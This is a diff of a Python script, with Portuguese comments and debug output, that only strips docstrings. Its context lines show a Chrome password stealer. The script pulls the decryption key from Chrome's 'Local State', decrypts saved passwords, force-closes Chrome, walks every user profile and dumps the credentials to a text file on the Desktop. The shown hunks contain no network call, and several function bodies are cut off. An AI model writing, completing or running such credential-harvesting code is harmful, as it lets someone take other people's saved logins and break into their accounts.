@@ -11,7 +11,6 @@ import ctypes
 import traceback
 
 def get_desktop_path():
-    """Detecta a pasta 'Desktop' no sistema."""
     print("[DEBUG] Obtendo o caminho da área de trabalho.")
     csidl_desktop = 0x0010
     buf = ctypes.create_unicode_buffer(260)
@@ -22,7 +21,6 @@ OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "ChromePasswords.txt")
 TEMP_DB_FILE = "temp_ChromePasswords.db"
 
 def get_profile_name(profile_path):
-    """Obtém o nome do perfil a partir do arquivo 'Preferences'."""
     print(f"[DEBUG] Obtendo o nome do perfil para '{profile_path}'")
     preferences_path = os.path.join(profile_path, "Preferences")
     
@@ -39,7 +37,7 @@ def get_profile_name(profile_path):
         return "Perfil Desconhecido"
 
 def get_key(keypath):
-    """Obtém a chave de criptografia do arquivo 'Local State' do Chrome."""
+    
     print(f"[DEBUG] Obtendo a chave de criptografia do arquivo '{keypath}'")
     try:
         if not os.path.exists(keypath):
@@ -66,7 +64,6 @@ def get_key(keypath):
     return None
 
 def password_decryption(password, encryption_key):
-    """Descriptografar a senha usando a chave fornecida."""
     print("[DEBUG] Descriptografando a senha")
     try:
         iv = password[3:15]
@@ -90,7 +87,6 @@ def password_decryption(password, encryption_key):
     return "Sem senhas"
 
 def close_chrome():
-    """Força o fechamento de todos os processos do Chrome."""
     print("[DEBUG] Forçando o fechamento dos processos do Chrome")
     for proc in psutil.process_iter(['pid', 'name']):
         if proc.info['name'] == 'chrome.exe':
@@ -103,7 +99,6 @@ def close_chrome():
                 print(f"[ERROR] Acesso negado ao processo {proc.info['pid']}.")
 
 def remove_temp_file():
-    """Remove o arquivo temporário com várias tentativas se necessário."""
     print("[DEBUG] Removendo o arquivo temporário")
     attempts = 0
     while attempts < 5:
@@ -118,7 +113,6 @@ def remove_temp_file():
             time.sleep(2)
 
 def get_credt(dbpath, keypath, profile_name):
-    """Extrai credenciais do banco de dados e escreve em um arquivo txt."""
     print(f"[DEBUG] Extraindo credenciais do banco de dados '{dbpath}'")
     credentials_found = False
     collected_info = []
@@ -167,7 +161,6 @@ def get_credt(dbpath, keypath, profile_name):
     return collected_info
 
 def process_profiles():
-    """Processa todos os perfis do Chrome para extrair credenciais."""
     print("[DEBUG] Iniciando o processamento dos perfis do Chrome")
     root_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
     if not os.path.exists(root_path):
